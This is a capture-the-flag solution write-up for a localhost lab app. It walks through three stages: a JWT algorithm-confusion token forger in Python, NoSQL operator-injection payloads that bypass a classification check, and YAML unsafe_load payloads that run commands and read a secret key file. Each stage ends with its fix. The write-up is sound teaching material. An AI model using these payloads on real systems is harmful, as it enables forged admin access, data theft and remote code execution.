# Dataroom — Solution

## Stage 1: JWT Algorithm Confusion → FLAG{jwt_4lg0r1thm_c0nfus10n}

**The vulnerability:** The server signs JWTs with RS256 (asymmetric — private
key signs, public key verifies). But `verify_token()` reads the `alg` header
from the token itself and switches verification logic accordingly. If the
token says `HS256`, the server uses the RSA **public key** as the HMAC secret.

Since the public key is... public, the attacker can sign their own tokens.

**Step 1 — Register and login, inspect the JWT:**

```bash
curl -s http://localhost:8099/api/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"test","password":"test"}'

curl -sv http://localhost:8099/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"test","password":"test"}' 2>&1 | grep Set-Cookie
```

Decode the JWT at jwt.io or with base64. Note `"alg": "RS256"` in the header.

**Step 2 — Get the public key:**

```bash
curl -s http://localhost:8099/api/public-key > pubkey.pem
```

Discoverable via the `/api` endpoint or the HTML source comment.

**Step 3 — Forge an admin token with HS256:**

```python
import hmac, hashlib, base64, json, time

pubkey = open("pubkey.pem", "rb").read()

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}))
payload = b64url(json.dumps({
    "sub": 1, "user": "admin", "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 86400,
}))
sig = hmac.new(pubkey, f"{header}.{payload}".encode(), hashlib.sha256).digest()
token = f"{header}.{payload}.{b64url(sig)}"
print(token)
```

**Step 4 — Use the forged token:**

```bash
TOKEN="<paste token here>"
curl -s -b "token=$TOKEN" http://localhost:8099/admin | grep FLAG
```

**Why it works:** The server reads `alg` from the untrusted token header. When
it sees `HS256`, it manually verifies the HMAC signature using the RSA public
key PEM as the HMAC secret. Since the public key is publicly available (at
`/api/public-key`), the attacker can sign their own tokens with the same key.
The server trusts the forged `role: admin` claim because the signature matches.

**The fix:** Never read the algorithm from the token header. Hardcode the
expected algorithm and always verify with the correct key type:
`jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])`.


## Stage 2: NoSQL Operator Injection → FLAG{n0sql_0p3r4t0r_1nj3ct10n}

**The vulnerability:** The admin query endpoint checks if the user is
requesting classified documents:

```python
if query.get("classification") == "classified":
    return error
```

This only catches the exact string `"classified"`. If the value is a dict
(a MongoDB-style operator), the equality check fails and the query passes
through to the filter engine, which processes the operators.

**The exploit:**

```bash
curl -s -b "token=$TOKEN" http://localhost:8099/api/admin/query \
  -H 'Content-Type: application/json' \
  -d '{"classification": {"$ne": "public"}}'
```

This returns all documents where classification is NOT "public" — including
classified ones. The classified "Acquisition Target Analysis" document
contains FLAG2.

Alternative payloads:
- `{"classification": {"$regex": "class"}}` — regex match
- `{"classification": {"$gt": "b"}}` — string comparison (classified > b)
- `{"classification": {"$in": ["classified","restricted"]}}` — explicit list

**Why it works:** The Python check `dict_value == "classified"` is always
`False` when the value is a dict, so the guard is bypassed. The query engine
then interprets the dict as an operator expression and matches documents
accordingly.

**The fix:** Validate input types before processing. Reject non-string values
for the classification field, or use an allowlist of permitted classifications.


## Stage 3: YAML Deserialization RCE → FLAG{y4ml_d3s3r14l1z4t10n_rc3}

**The vulnerability:** The YAML import endpoint uses `yaml.unsafe_load()`,
which processes `!!python/` tags that instantiate arbitrary Python objects —
including calling any importable function with attacker-controlled arguments.

**The exploit:**

Paste this into the Import YAML textarea (or send via curl):

```yaml
!!python/object/apply:subprocess.check_output
- - cat
  - /tmp/vault_master_key.txt
```

Via curl:

```bash
curl -s -b "token=$TOKEN" http://localhost:8099/api/admin/import-yaml \
  -H 'Content-Type: application/x-yaml' \
  -d '!!python/object/apply:subprocess.check_output
- - cat
  - /tmp/vault_master_key.txt'
```

The response contains the file contents including FLAG3.

Alternative payloads:
```yaml
# os.system (fire-and-forget, returns exit code only)
!!python/object/apply:os.system
- cat /tmp/vault_master_key.txt

# os.popen (returns file object, less useful)
!!python/object/apply:os.popen
- cat /tmp/vault_master_key.txt

# eval (arbitrary Python expression)
!!python/object/apply:builtins.eval
- __import__('subprocess').check_output(['cat','/tmp/vault_master_key.txt'])
```

**Why it works:** `yaml.unsafe_load()` is the YAML equivalent of
`pickle.loads()`. The `!!python/object/apply:module.func` tag tells the
YAML parser to import `module.func` and call it with the provided arguments.
There is no sandbox or allowlist.

**The fix:** Use `yaml.safe_load()` instead. It only supports basic YAML
types (strings, numbers, lists, dicts) and rejects all `!!python/` tags.
